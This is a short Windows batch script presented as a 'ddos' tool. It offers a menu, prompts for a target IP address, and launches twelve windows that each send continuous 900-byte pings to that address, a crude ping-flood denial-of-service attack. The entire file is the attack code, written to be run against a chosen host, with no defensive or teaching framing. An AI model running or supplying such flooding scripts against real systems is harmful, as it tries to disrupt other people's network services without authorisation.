@echo off
goto menu


:menu
ECHO 1=ddos
echo 2=exit
SET /P INPUT=Please select a number:

IF /I '%INPUT%'=='1' GOTO main2
IF /I '%INPUT%'=='2' GOTO exit


:exit
exit



:main2
cls
SET /P ip=enter ip:
cls
echo DO NOT CLOSE ANY STARTED WINDOWS
pause


start ping %ip% -t -l 900
start ping %ip% -t -l 900
start ping %ip% -t -l 900
start ping %ip% -t -l 900
start ping %ip% -t -l 900
start ping %ip% -t -l 900
start ping %ip% -t -l 900
start ping %ip% -t -l 900
start ping %ip% -t -l 900
start ping %ip% -t -l 900
start ping %ip% -t -l 900
start ping %ip% -t -l 900
